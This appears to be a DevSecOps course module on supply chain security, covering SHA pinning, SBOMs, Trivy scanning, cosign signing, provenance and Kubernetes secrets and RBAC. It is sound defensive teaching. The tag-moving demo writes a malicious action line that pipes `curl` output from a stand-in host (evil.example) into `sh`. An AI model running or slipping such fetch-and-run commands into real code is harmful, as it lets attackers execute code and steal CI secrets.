title: DevSecOps
intro: Part 13 adds security to everything you have built. Day 52 follows the software supply chain from a git tag to a signed image you can verify, with three real attacks as the map. Day 53 protects what runs: secrets, access rights, and rules the cluster checks at the door. It comes this late on purpose, because you can only secure a pipeline and a cluster you understand.

lessons.title: The software supply chain
lessons.goal: By the end you can explain how attackers get into a software supply chain, and list, scan, sign and verify the hello-devops image so you know what you ship and who built it.

guess.q: Your workflow uses `some-org/scan-action@v4`. An attacker steals the maintainer's token and pushes new code. What runs in your next build?
options: The old code, because a version tag can never move
Nothing, because GitHub blocks changed actions
The attacker's code, because the tag can be moved
The old code, because your runner caches actions
guess.why: A git tag is a movable pointer. Attackers moved tj-actions tags in 2025 and trivy-action tags in 2026; a full commit SHA cannot be moved.

terms.plain: Everything your code passes through on the way to production: libraries, base images, build tools, CI actions and registries.
An attack on something you depend on, so that your own build ships the attacker's code.
A public ID for one known security hole, such as CVE-2024-3094 for the xz backdoor.
Software bill of materials: a machine-readable list of every package and version inside an artifact.
Naming an action by its full 40-character commit hash, which always means the same code, instead of a movable tag.
Signing with a 10-minute certificate tied to an identity, such as your release workflow, so no private key is stored.
A signed record of how an artifact was built: which repository, commit and workflow made it.
Supply-chain Levels for Software Artifacts: build levels 0 to 3 that grade how far you can trust a build.

sections.h: Your image is mostly other people's work
sections.body:
Count what is inside the hello-devops image you built on Day 16. Your own code is one file, `app.py`. Everything else came from people you have never met:
- 87 Debian packages from the `python:3.14-slim` base image.
- Python itself.
- Flask, gunicorn, redis and their dependencies: about 10 Python packages.

And that is only what ships. To build the image, your release workflow also runs code you did not write: the GitHub runner, the Docker actions, a scanner and a signing tool. Each of those steps runs with your workflow's rights, so each one could read the workflow's token.

All of this together is your software supply chain: every piece your code passes through between your keyboard and production. A supply chain attack goes after one of those pieces instead of your code. It works because you trust the pieces and run them without reading them.

DevSecOps means building security checks into that chain as automatic steps, owned by the people who ship. Two ideas carry most of it:
1. Shift left: run cheap checks early. A leaked token caught before `git push` costs a minute. Found in production, it costs a weekend of rotating keys.
2. Least privilege: every person, token and Pod gets only the rights it needs, for as short a time as possible. You have done this already, with the `permissions:` block on Day 21 and the non-root user on Day 16.

sections.body:
Real incidents teach this better than any diagram. Each of these hit a different link, and none of them touched the victims' own code.

The xz-utils backdoor (2024). xz is a small compression library that almost every Linux system has. A contributor earned the maintainer's trust over time, then hid malicious code in the release tarballs of versions 5.6.0 and 5.6.1. The code was not in the git repository. It sat in extra build files inside the tarballs, and on some systems it reached the SSH server. A developer, Andres Freund, noticed SSH logins using too much CPU while benchmarking, and traced the cause to xz. The [GitHub advisory](https://github.com/advisories/GHSA-rxwq-x6h5-x525) scores it 10 out of 10.

tj-actions/changed-files (March 2025). Attackers moved this popular GitHub Action's version tags to a malicious commit. For about a day, every workflow that used one of those tags ran a script that printed CI secrets into the build log. [GitHub's advisory](https://github.com/advisories/GHSA-mrrh-fwg8-r2c3) says over 23,000 repositories used the action.

Trivy (March 2026). Trivy is a security scanner, the same one in your release workflow. After an earlier breach, the attackers still had working credentials, because the key rotation was not done all at once. On 19 March they published a malicious Trivy v0.69.4 and force-pushed 76 of the 77 `trivy-action` tags. The payload stole secrets and then ran the real scan, so builds looked normal. [Aqua's advisory](https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23) notes that images pulled by digest were not affected.

Three lessons follow:
- A trusted maintainer can turn bad, so you need to know exactly what you ship.
- A tag can be moved, so pin to things that cannot move: commit SHAs and image digests.
- Security tools are part of the chain too. After an incident, rotate every secret a bad step could read.

sections.h: Tags move, commit SHAs do not
sections.body:
This trips up most people, so slow down here. When you write `uses: some-org/action@v4`, the `v4` is a git tag. A tag is a name that points at one commit, like a sticky note on a page. Anyone with push rights to that repository can peel the note off and stick it on a different commit. Your next run then executes the new code, and nothing in your own repository changed.

A commit SHA is different. It is a 40-character hash of the commit's content: its files, its parent commit, its author and its message. Change one byte and you get a different SHA. So `uses: some-org/action@<full-sha>` always means the same code. In March 2026 the attacker moved 76 `trivy-action` tags, but could not change what an old SHA points to.

Look at the scan step in the lab's `release.yml`:
`uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0`

The SHA is what runs. The comment is only for humans, and Dependabot (Day 21) updates both when a new release appears. That is the price of pinning: pinned code never changes by itself, so you need a bot to bring you fixes, and a person to review them.

Images follow the same rule. A tag such as `hello-devops:1.2.0` can be pushed again with new content. A digest such as `@sha256:` followed by 64 hex characters cannot. That is why the workflow signs the digest.

One gap in the lab: `actions/checkout@v7` and `actions/attest@v4` still use tags. They come from GitHub itself, and many teams accept that risk. Stricter teams pin them too, and for a release workflow I would.

sections.h: Know what you ship: SBOMs and scanners
sections.body:
An SBOM (software bill of materials) is the ingredient list of an artifact: every package and version inside it, in a format machines can read. The two standard formats are SPDX and CycloneDX. The tool `syft` reads an image and writes either one, or both.

Why keep a list? Picture the morning the next xz is announced. Without SBOMs, every team pulls and inspects its images to find out whether they are affected. With an SBOM stored for every release, you search the files and have the answer in minutes.

A vulnerability scanner takes that list and compares it with public databases of known holes. Each hole has a CVE ID and a severity: LOW, MEDIUM, HIGH or CRITICAL. Trivy and grype are the two common free scanners. Trivy can also check Dockerfiles, Kubernetes YAML and Terraform for risky settings.

Scanners have two limits:
- They cannot find a backdoor nobody has reported yet. The xz code had no CVE until the day it was found.
- They go stale. New CVEs are published against old packages every day.

So scan in CI, and also re-scan the stored SBOMs on a schedule. `grype sbom:./sbom.spdx.json` checks an old release without pulling the image.

Decide in advance what fails the build. My rule: fail on HIGH and CRITICAL findings that already have a fixed version, and track the rest. That is exactly what the release workflow does with `severity: CRITICAL,HIGH` and `ignore-unfixed: true`. When it fails, update first, then remove what you do not need, and only then accept a risk in a `.trivyignore` file, with a reason and a date.

sections.h: Signing: who built this, and has it changed?
sections.body:
A scan tells you what is inside. A signature answers two other questions: who made this artifact, and has anyone changed it since? Classic signing needs a private key, and a private key in CI is one more secret that can leak.

**Keyless signing** with cosign, from the Sigstore project, removes the stored key. Here is what happens in the release job:
1. The job asks GitHub for an OIDC token: a short signed note that says "I am release.yml in this repository, running for tag v1.2.0". You met OIDC on Day 21, for cloud logins.
2. cosign makes a fresh key pair that lives only in memory.
3. Fulcio, Sigstore's certificate authority, checks the token and issues a certificate for that key. It is valid for 10 minutes and has the workflow identity written inside.
4. cosign signs the image digest and stores the signature in the registry, next to the image.
5. The signing event goes into Rekor, a public log that only grows. Nobody can quietly remove or rewrite an entry.

To verify, you name the identity you expect. `cosign verify` takes `--certificate-identity` (your workflow file and tag) and `--certificate-oidc-issuer` (GitHub's token service). An image signed by anyone else fails.

The [cosign README](https://github.com/sigstore/cosign/blob/main/README.md) adds two warnings. Sign the digest, never a tag, or you might sign something you did not intend. And when you sign as a person, your email goes into the public log, where it cannot be removed.

A signature proves origin, not quality. A signed image can still be full of bugs.

sections.body:
A signature says who signed. Provenance says how the thing was built: which repository, which commit, which workflow file and which kind of runner. It is a signed statement in a standard format (in-toto), bound to the artifact's digest. Think of a delivery note that names the factory and the production line, with a stamp on it.

SLSA (say "salsa") turns this into levels. The build track of the [SLSA spec](https://github.com/slsa-framework/slsa/blob/main/spec/build-track-basics.md):
- Build L0: no guarantees.
- Build L1: provenance exists. It catches mistakes, but anyone could have written it.
- Build L2: a hosted build platform signs the provenance. It catches tampering after the build.
- Build L3: a hardened build platform. It catches tampering during the build.

GitHub artifact attestations give you Build L2 in one step. The lab calls `actions/attest@v4` twice. With no SBOM input it writes SLSA provenance. With `sbom-path` it attaches the SBOM as a second signed attestation. Moving the build into a shared reusable workflow (Day 20) is GitHub's documented path to L3.

Now the step most teams skip. [GitHub's own docs](https://docs.github.com/en/actions/concepts/security/artifact-attestations) say that generating attestations alone gives no security benefit. Someone has to verify them, for example with `gh attestation verify`. Until a person or a machine checks it, an attestation is a receipt nobody reads.

sections.h: Read the release workflow in order
sections.body:
Open `.github/workflows/release.yml` in Files below and follow one tag push through it. The order is on purpose:
1. `permissions:` gives this job four rights: read the code, push packages, ask for an OIDC token, write attestations.
2. Build once for the runner's own platform with `load: true`. The image exists locally, and nothing is pushed yet.
3. Scan that local image with Trivy. If the scan fails, the job stops, and nothing bad reaches the registry.
4. Build and push for amd64 and arm64. This step outputs the digest.
5. Write the SBOM of the pushed digest with `anchore/sbom-action`.
6. Sign that digest with cosign.
7. Attest the provenance, then the SBOM, both bound to the same digest.

Every step after the push uses `${IMAGE}@${DIGEST}`, never a tag. And every third-party action is pinned to a SHA, including the scanner that was attacked in March 2026. The workflow is the same file you wrote on Day 21. Today adds steps 2, 3, 5, 6 and 7, and the two rights they need.

lessons.analogy: Think of a jar of jam in a shop. The ingredient label is the SBOM, and checking that label against the food recall list is the scan. The tamper-evident seal with the factory's stamp is the signature, and the delivery note that names the factory and the production line is the provenance. The shop's rule "no seal, no sale" is verification before deploy. Where it breaks: a seal proves who packed the jar and that nobody opened it, but says nothing about whether the jam is good.

worked.title: Watch a tag move, then read a real pin

steps.say: Make a throwaway repository that plays an action's maintainer. Tag the first commit `v1`, the way an action publishes a release.
steps.code:
$ mkdir /tmp/tagdemo && cd /tmp/tagdemo && git init -q
$ echo 'echo "scanning..."' > action.sh
$ git add . && git commit -qm "Release 1.0" && git tag v1
$ git rev-parse v1
fdc7302786077937dd5afcc0a0b7d31de75a46e9

steps.say: Now play the attacker with a stolen token. Change the code, commit, and move the tag with `-f`. A workflow that says `@v1` would now run the new code, and its own file did not change at all.
steps.code:
$ echo 'echo "scanning..."; curl -s https://evil.example/steal | sh' > action.sh
$ git commit -qam "Innocent-looking fix"
$ git tag -f v1
Updated tag 'v1' (was fdc7302)
$ git rev-parse v1
2df87fdf0effb81f0db1334d84a8bf3a7c72cb45

steps.say: The old commit is still there, and its SHA still names the old code. A workflow pinned to `fdc7302...` keeps running what you reviewed. Your hashes will differ from mine, because a SHA includes the author and the time.
steps.code:
$ git show fdc7302:action.sh
echo "scanning..."
$ git log --oneline
2df87fd Innocent-looking fix
fdc7302 Release 1.0

steps.say: Now check a real pin. `git ls-remote` asks GitHub what a tag points to, without cloning. Release tags are often annotated: a small tag object of their own. The line ending in `^{}` is the commit underneath, and that is the SHA in the lab's workflow.
steps.code:
$ git ls-remote https://github.com/aquasecurity/trivy-action \
    refs/tags/v0.36.0 'refs/tags/v0.36.0^{}'
a9c7b0f06e461e9d4b4d1711f154ee024b8d7ab8	refs/tags/v0.36.0
ed142fd0673e97e23eac54620cfb913e5ce36c25	refs/tags/v0.36.0^{}
$ cd ~/code/hello-devops && grep trivy-action .github/workflows/release.yml
        uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0

steps.say: If the two ever disagree, either someone moved the tag after you pinned, or your comment is stale. In both cases the SHA is what runs. Dependabot opens a pull request when a newer release appears, and you review that change like any other code. Delete the demo with `rm -rf /tmp/tagdemo`.

code.title: .github/workflows/release.yml (Day 52: scan, SBOM, sign, attest)
code.src:
name: release

# Runs when you push a version tag such as v1.2.0.
on:
  push:
    tags: ["v*"]

# Default for every job: the GITHUB_TOKEN can only read the repository.
permissions:
  contents: read

jobs:
  image:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    # Approval gate: add required reviewers to "production" in
    # Settings > Environments. Without rules, the job just runs.
    environment: production
    # This job alone gets more rights, and only the ones it needs.
    permissions:
      contents: read
      packages: write # push images to GHCR
      id-token: write # ask GitHub for an OIDC token, used for keyless signing (Day 52)
      attestations: write # store provenance and SBOM attestations (Day 52)
    steps:
      - uses: actions/checkout@v7

      # Third-party actions are pinned to a full commit SHA.
      # The comment shows the version. Dependabot keeps both up to date.
      - name: Set up QEMU (to build arm64 on an amd64 runner)
        uses: docker/setup-qemu-action@99012661954931238ded8c8b007157a8430204e1 # v4.4.0
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1

      - name: Log in to GitHub Container Registry
        uses: docker/login-action@81c6f93d4bc991e510b342a00b419b3bb4efc5c6 # v4.7.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      # Registries need lower case names, and a GitHub user name may have capitals.
      - name: Set the image name
        run: echo "IMAGE=ghcr.io/${GITHUB_REPOSITORY,,}" >> "$GITHUB_ENV"

      - name: Work out image tags and labels
        id: meta
        uses: docker/metadata-action@dc802804100637a589fabce1cb79ff13a1411302 # v6.2.0
        with:
          images: ghcr.io/${{ github.repository }}
          # Tag v1.2.0 gives 1.2.0, sha-<short commit> and latest.
          tags: |
            type=semver,pattern={{version}}
            type=sha

      # Day 52, step 1: build for this runner only and load the image into
      # the local Docker engine. Nothing is pushed yet.
      - name: Build the image for scanning
        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          load: true
          tags: hello-devops:scan
          build-args: APP_VERSION=${{ steps.meta.outputs.version }}
          cache-from: type=gha

      # Day 52, step 2: stop the release on HIGH or CRITICAL issues that have a fix.
      - name: Scan the image with Trivy
        uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0
        with:
          image-ref: hello-devops:scan
          severity: CRITICAL,HIGH
          ignore-unfixed: true
          exit-code: "1"

      - name: Build and push (amd64 and arm64)
        id: build
        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          platforms: linux/amd64,linux/arm64
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          # The app reports this version at "/" (1.2.0 for tag v1.2.0).
          build-args: APP_VERSION=${{ steps.meta.outputs.version }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

      # Day 52, step 3: write the ingredient list (SBOM) of the pushed image.
      - name: Create an SBOM (SPDX format)
        uses: anchore/sbom-action@66cbf4bc1f1c0d2edc94016e65bc221b6bb0ad6c # v0.24.3
        with:
          image: ${{ env.IMAGE }}@${{ steps.build.outputs.digest }}
          format: spdx-json
          output-file: sbom.spdx.json

      # Day 52, step 4: sign the image by its digest. Keyless: no private key to
      # store or leak. The signature is tied to this workflow's identity.
      - name: Install cosign
        uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4.1.2
      - name: Sign the image
        env:
          DIGEST: ${{ steps.build.outputs.digest }}
        run: cosign sign --yes "${IMAGE}@${DIGEST}"

      # Day 52, step 5: record how the image was built (SLSA provenance) and
      # attach the SBOM. Free for public repositories. Storage records only
      # work for repositories owned by an organization, so they are off here.
      - name: Attest build provenance
        uses: actions/attest@v4
        with:
          subject-name: ${{ env.IMAGE }}
          subject-digest: ${{ steps.build.outputs.digest }}
          push-to-registry: true
          create-storage-record: false
      - name: Attest the SBOM
        uses: actions/attest@v4
        with:
          subject-name: ${{ env.IMAGE }}
          subject-digest: ${{ steps.build.outputs.digest }}
          sbom-path: sbom.spdx.json
          push-to-registry: true
          create-storage-record: false

      - name: Show the image digest in the run summary
        env:
          DIGEST: ${{ steps.build.outputs.digest }}
          TAGS: ${{ steps.meta.outputs.tags }}
        run: |
          {
            echo "### Pushed and signed image"
            echo "Digest: \`$DIGEST\`"
            echo '```'
            echo "$TAGS"
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"

code.title: security/verify-release.sh
code.src:
#!/usr/bin/env bash
# Verify a hello-devops release before you run it (Day 52).
#
# It looks up the digest behind a version tag once, then checks that digest three ways:
#   1. cosign: the image was signed by YOUR release workflow, for this exact tag.
#   2. gh: a SLSA build provenance attestation exists, made by the same workflow.
#   3. gh: an SBOM attestation (SPDX) exists for the same digest.
# If all three pass, it prints the digest. Deploy that digest, not the tag.
#
# Needs: docker, jq, cosign and gh (brew install jq cosign gh), and gh auth login.
# Usage:   security/verify-release.sh <github-user> <version>
# Example: security/verify-release.sh octocat 1.2.0
set -euo pipefail

if [[ $# -ne 2 ]]; then
  echo "Usage: $0 <github-user> <version>   (for example: $0 octocat 1.2.0)" >&2
  exit 2
fi
user="$1"
version="$2"

# Registry names are lower case (release.yml does the same with ${GITHUB_REPOSITORY,,}).
image="ghcr.io/$(echo "$user" | tr '[:upper:]' '[:lower:]')/hello-devops"
workflow="${user}/hello-devops/.github/workflows/release.yml"

echo "==> Looking up the digest of ${image}:${version}"
digest=$(docker buildx imagetools inspect "${image}:${version}" --format '{{json .Manifest}}' | jq -r .digest)
echo "    ${digest}"

echo "==> 1/3 Signature (cosign)"
# The identity is the workflow file AND the tag that started the run.
cosign verify "${image}@${digest}" \
  --certificate-identity "https://github.com/${workflow}@refs/tags/v${version}" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  > /dev/null
echo "    OK: signed by ${workflow} for tag v${version}"

echo "==> 2/3 Build provenance (gh attestation)"
gh attestation verify "oci://${image}@${digest}" \
  --owner "$user" \
  --signer-workflow "$workflow" \
  > /dev/null
echo "    OK: SLSA provenance from ${workflow}"

echo "==> 3/3 SBOM attestation (gh attestation)"
gh attestation verify "oci://${image}@${digest}" \
  --owner "$user" \
  --signer-workflow "$workflow" \
  --predicate-type "https://spdx.dev/Document/v2.3" \
  > /dev/null
echo "    OK: SPDX SBOM attached"

echo
echo "All checks passed. Deploy this exact image:"
echo "${image}@${digest}"

commands.cmd: brew install syft grype trivy cosign
commands.what: Install the SBOM, scanning and signing tools.
Write an SBOM of a local image in both standard formats at once.
Scan an image the way CI does: fail on serious bugs that have a fix.
Scan a saved SBOM for known CVEs, without the image.
Scan the project folder for vulnerable libraries, leaked secrets and risky config.
Show which commit a remote tag points to right now.
Show the digest behind a tag in the registry.
Check that your release workflow signed this digest, for tag v1.2.0.
Check the SLSA provenance attestation and which workflow made it.
Check the SBOM attestation instead of the provenance.
Run all three checks and print the digest to deploy.

lessons.mistake: Generating signatures, SBOMs and attestations and never checking them. GitHub's docs say it plainly: attestations give no security benefit until someone verifies them. Put a verify step where it matters: `security/verify-release.sh` before a manual deploy, and later an admission policy in the cluster (see Go deeper).
lessons.real_world: At a payments company, auditors ask two questions about every release: what is in it, and who built it? The release pipeline answers both with a stored SBOM and a signed provenance attestation per image. When a critical CVE is announced, the security team searches the stored SBOMs and opens pull requests for the affected services, instead of asking every team to check by hand.

task.title: Ship and verify a signed release
steps: Install the tools with `brew install syft grype trivy cosign`.
Build `hello-devops:1.2.0` locally (Day 16). Write an SPDX SBOM with syft, then find the version of flask inside the JSON.
Scan the image with trivy using the same gate as CI: HIGH and CRITICAL, fixed issues only, and `--exit-code 1`. Then scan the saved SBOM with grype and compare the two reports.
Add the scan, SBOM, sign and attest steps to your `.github/workflows/release.yml` (the full file is in Files). Keep the job's `permissions:` block exactly as shown.
Commit and push, then tag `v1.2.0` and push the tag. Follow the run with `gh run watch`.
Copy `security/verify-release.sh` into your repository and run it with your user name and 1.2.0.
Break it on purpose: run the script's `cosign verify` command by hand with `v1.1.0` in the identity. Read the error and explain why it fails.
hints: Artifact attestations are free for public repositories. On a private personal repository the attest steps fail, so make the repository public or remove those two steps.
If cosign finds no matching signatures, compare the identity letter by letter: user name (case matters), workflow file and tag must match the run.
jq reads the SBOM: `jq -r '.packages[] | select(.name=="flask") | .versionInfo' sbom.spdx.json`.

explain_back.prompt: Explain in 3 to 4 sentences how your release now protects the supply chain. Mention pinning, the SBOM, the signature and verification.
explain_back.answer: Every third-party action in the release workflow is pinned to a full commit SHA, so a moved tag cannot change the code that runs. Before pushing, the job scans the image and stops on serious bugs that have a fix. After pushing, it writes an SBOM of the exact digest, signs that digest keylessly with cosign, and attaches signed provenance that names the repository, commit and workflow. None of that helps until someone checks it, so I verify the signature and both attestations before I deploy, and I deploy the digest, not the tag.

recap: Your image is mostly other people's code, and your build runs other people's actions with your rights.
xz, tj-actions and Trivy each hit a different link: a maintainer, an action's tags and a security tool.
Tags can move; commit SHAs and image digests cannot. Pin to them and let Dependabot bring updates.
An SBOM lists what is inside; scanners match it against known CVEs, today and again later.
Keyless signing ties a signature to your workflow identity; provenance records how the image was built.
Nothing is protected until you verify: cosign verify and gh attestation verify before you deploy.

check.q: A critical CVE is announced in a Python library. What answers "which of our released images contain it?" fastest?
options: The Dockerfile in each repository
The SBOMs stored for each release
The cosign signatures of each image
The Trivy logs from each release day
check.why: SBOMs list every package and version per release, so you search them; old scan logs were written before this CVE existed.

check.q: A teammate says: "The image is signed, so it has no vulnerabilities." What does the signature actually prove?
options: The image passed every scan in CI
Two reviewers approved the code in it
The image layers are encrypted at rest
Your workflow made it, and it is unchanged
check.why: A signature proves origin and integrity, not quality; a signed image can still contain known bugs.

check.q: Your workflow pins `docker/login-action` to a full SHA. Tonight the maintainers' account is hijacked and every tag is moved. What runs in tomorrow's build?
options: The same reviewed code as before
The attacker's code from the moved tag
Nothing, since GitHub disables the action
Whatever the newest release is by then
check.why: A SHA names one exact commit, so moving tags does not change what a pinned step runs.

interview.q: What is a software supply chain attack, and how would you defend a CI/CD pipeline against one?
interview.a: It is an attack on something you depend on, such as a library, a base image or a CI action, so that your own build ships the attacker's code. The xz-utils backdoor and the tj-actions and Trivy tag hijacks are recent examples. I pin third-party actions and base images to SHAs and digests, keep workflow permissions minimal, and use OIDC instead of stored keys. Every release gets an SBOM, a scan, a signature and provenance, and I verify them before deploying. After an incident I rotate every secret that a compromised step could read.

interview.q: What do an SBOM, a signature and provenance each prove, and what don't they prove?
interview.a: An SBOM lists what is inside an artifact, so you can find vulnerable packages quickly. A signature proves who produced the artifact and that it has not changed since. Provenance records how it was built (source, commit and build workflow), and SLSA levels say how far you can trust that record. None of them proves the code is free of bugs or malice: the xz backdoor came from a trusted maintainer's own release. Together they make the path from source to running image checkable, which is what you need during an incident.

interview.q: Why pin GitHub Actions to commit SHAs instead of version tags, and what does it cost you?
interview.a: A tag is a movable pointer, so whoever controls the action's repository can point it at new code, which is what happened with tj-actions and trivy-action. A full commit SHA is a hash of the content, so it always names the same code. The cost is that you stop getting fixes automatically, so you need Dependabot or Renovate to propose updates that a person reviews. I keep the version as a comment after the SHA so people can still read it.

deeper.body:
Three ideas take today's work further.

First, look one level down. `trivy-action` is a composite action: it runs another action, `aquasecurity/setup-trivy`, to install the Trivy binary. Your SHA pin fixes the outer code. What about the inner one? Open the action's `action.yaml` at the SHA you pinned, and you find:
- `uses: aquasecurity/setup-trivy@3fb12ec12f41e471780db15c232d5dd185dcb514 # v0.2.6`, a pin by SHA.
- A `version` input whose default is a fixed Trivy release, `v0.70.0`, not `latest`.

So the maintainers pinned their own dependency too, and Aqua's advisory lists setup-trivy 0.2.6 as the first safe version. When you adopt an action, read its action file once. If it installs `latest` of anything, set the version yourself.

Second, a caveat on SHAs. GitHub's [secure use reference](https://docs.github.com/en/actions/reference/security/secure-use) says to check that a SHA comes from the action's own repository, not a fork. GitHub stores a repository and its forks together, so a commit that exists only in a fork can still be fetched through the original name. Aqua's advisory calls this an imposter commit, and the Trivy attackers used one. Let Dependabot write your pins instead of copying SHAs from a blog post. GitHub now also documents [workflow dependency lockfiles](https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles). The lockfile is `.github/workflows/actions.lock`, made by the `gh actions-lock` extension. It pins every action, including the actions your actions use, and checks at run time that each commit belongs to the right repository. It is new, so read the docs before you adopt it.

Third, let the cluster do the verifying. Kyverno (Day 53) has a policy type for this, ImageValidatingPolicy. You tell it:
- Which images it covers, for example `ghcr.io/<your-github-user>/*`.
- Which identity must have signed them: your release workflow and GitHub's OIDC issuer, the same values you pass to `cosign verify`.
- Optionally, which attestations must exist, such as SLSA provenance.

When a Pod arrives, Kyverno looks up the signature in the registry and checks it. An unsigned image, or one signed by another workflow, is rejected. The check needs network access to the registry and to Sigstore, and one typo in the identity blocks every deploy. So start it in Audit mode, like the policies on Day 53.

lessons.title: Secrets, access and policy as code
lessons.goal: By the end you can keep secrets out of git and out of plain sight, give each identity only the access it needs, and make the cluster refuse risky objects with Kyverno policies.

guess.q: You store a database password in a Kubernetes Secret in namespace hello. By default, who can read the password?
options: Only Pods that mount it, since Secrets are encrypted
Nobody, because the value is base64 encoded
Anyone who may read Secrets or create Pods there
Only cluster admins, whatever the RBAC rules say
guess.why: Base64 is an encoding, not encryption, and etcd stores Secrets unencrypted by default. Anyone who may create a Pod in the namespace can mount the Secret and print it.

terms.plain: An object for small sensitive values. They are base64 encoded and, by default, stored unencrypted.
One audited service that stores, hands out, rotates and revokes secrets, such as Vault, OpenBao or AWS Secrets Manager.
Searching files and git history for passwords and tokens, ideally before they are pushed.
Role-based access control: rules that say which identity may use which verbs on which Kubernetes resources.
A Kubernetes identity for a program, such as a Pod, a CI job or an AI agent.
The API server's last check, which can change or reject an object before it is stored.
Three built-in levels (privileged, baseline, restricted) that say how locked down a Pod must be.
Rules about what objects may look like, kept in git, tested in CI and enforced by the cluster.

sections.h: A Kubernetes Secret is not locked
sections.body:
Day 34 showed that a Secret's values are base64 encoded. Base64 is a different alphabet, not a lock: anyone can run `base64 -d`. The [Kubernetes docs](https://kubernetes.io/docs/concepts/configuration/secret/) call such a value obscured but not secret.

Two less obvious facts make the group of readers bigger than you think:
- By default, Secrets are stored unencrypted in etcd, the cluster's database. Anyone with access to etcd or its backups can read them.
- Anyone who may create a Pod in a namespace can read every Secret in that namespace. They never need `get secrets`. They start a Pod that loads the Secret and prints it. The same holds for anyone who may create a Deployment.

This trips up most people, so the worked example below proves it on your own cluster. One more detail from the RBAC docs: `list` and `watch` on Secrets also reveal the values, because a list returns the full objects.

So the protection has layers:
1. On a real cluster, turn on encryption at rest for Secrets.
2. Keep the list of people and programs that can create Pods in a namespace short. The namespace is the real boundary.
3. Keep the real values in a secrets manager and copy them into the cluster only where they are needed.
4. Never put the value in git, not even for one commit.

sections.body:
Git never forgets. Commit a token, delete it in the next commit, and the token is still in history, in every clone and every fork. So deleting the file fixes nothing. The fix is to rotate: revoke the leaked value where it was issued and create a new one. Treat anything that reached a remote as public.

I tested this with gitleaks on a small repository. One commit added a GitHub token in `.env.local`. The next commit deleted the file. A scan with `gitleaks dir` looks only at the files as they are now, and it said `no leaks found`. A scan with `gitleaks git` reads the whole history, and it said `leaks found: 1`, with the commit, the file and the line.

Catch secrets before they reach the remote, with two layers:
- gitleaks on your laptop, ideally as a pre-commit hook, so the bad commit never happens. Run `gitleaks git -v` once on every old repository too.
- GitHub push protection on the server. It blocks a push that contains a known secret format, such as cloud keys, tokens and private keys. For your own account it is on by default when you push to public repositories.

Both layers have holes. Scanners look for known formats and random-looking strings, so a plain password such as `summer2026` can slip through. A person can skip the hook with `SKIP=gitleaks`, and push protection lets you continue if you give a reason. Use them as a safety net, and keep secrets out of files in the first place: local values go in a `.env` file, which the lab's `.gitignore` already ignores.

sections.h: Where secrets should live, and how they reach the cluster
sections.body:
A secrets manager is one audited place that stores secrets, hands them out, rotates them and revokes them. Every read is logged. The common ones:
- HashiCorp Vault. Since version 1.15 it is source-available under the Business Source License, now with IBM as licensor. You may run it in production, unless you offer it to others as a service that competes with IBM's paid versions.
- OpenBao. An open source (MPL-2.0) fork of Vault 1.14, hosted by the OpenSSF.
- Your cloud's own manager: AWS Secrets Manager, Google Secret Manager or Azure Key Vault.

The values live there, but Kubernetes still wants a Secret object. Something has to carry the value into the cluster. There are three common patterns, and the question to ask is which file is safe to commit:
- External Secrets Operator (ESO). You commit an ExternalSecret that names a key in the manager. A controller fetches the value, writes a normal Secret, and fetches again on a timer. Git holds no secret at all.
- Sealed Secrets. `kubeseal` encrypts a Secret with the cluster controller's public key, and only that controller can decrypt it. You commit the SealedSecret.
- SOPS. It encrypts the values in a YAML file, leaving the keys readable, with age, PGP or a cloud key service. You commit the encrypted file and decrypt at deploy time.

At work my default is ESO plus the cloud's secret manager. Rotation happens in one place, and nothing secret ever enters git. Sealed Secrets suits a small team with one cluster and no cloud manager. The lab's `security/external-secret-fake.yaml` practises the ESO pattern with ESO's fake provider, so you need no cloud account.

sections.body:
RBAC (role-based access control) answers one question for every request: may this identity do this verb on this resource? It uses four objects:
- A Role lists rules, such as get, list and watch on pods, inside one namespace.
- A ClusterRole is the same, for the whole cluster.
- A RoleBinding gives a Role, or a ClusterRole, to a subject in one namespace.
- A ClusterRoleBinding gives a ClusterRole to a subject everywhere.

The subject is a user, a group or a ServiceAccount. A ServiceAccount is an identity for a program: a Pod, a CI job, an AI agent. Day 38 taught you to read `forbidden` errors. Today you write the rules.

The [official good practices](https://kubernetes.io/docs/concepts/security/rbac-good-practices/) fit in four lines:
1. Bind inside a namespace with a RoleBinding whenever you can.
2. Avoid wildcards. A `*` grants every resource type that exists today and every type added later.
3. Do not use `cluster-admin` for daily work.
4. Know the rights that are bigger than they look: creating Pods, `get` on `nodes/proxy`, and the verbs that change RBAC itself (`escalate`, `bind`, `impersonate`).

Two habits for ServiceAccounts. Give each app its own, never the namespace's `default`. And if the app never calls the Kubernetes API (hello-devops does not), set `automountServiceAccountToken: false`, so a broken-into Pod has no token to steal.

Test before you trust. `kubectl auth can-i` with `--as=system:serviceaccount:<namespace>:<name>` asks the API server directly what an identity may do.

sections.h: Admission control: the last check before etcd
sections.body:
Every request to the Kubernetes API passes three gates, in order:
1. Authentication: who are you? A certificate or a token answers.
2. Authorization: may you do this? RBAC answers.
3. Admission: is this particular object acceptable?

**Admission control** is that third gate. Admission controllers can change an object (mutating) or reject it (validating) before it is stored in etcd. RBAC decides whether you may create Deployments at all. Admission decides whether this Deployment, with `privileged: true` or an image tagged `:latest`, is allowed.

Kubernetes has a built-in admission check made for Pod hardening: Pod Security Admission. It enforces the Pod Security Standards, which have three levels:
- privileged: no restrictions.
- baseline: blocks known ways to escape to the node, such as privileged containers and sharing the host's network.
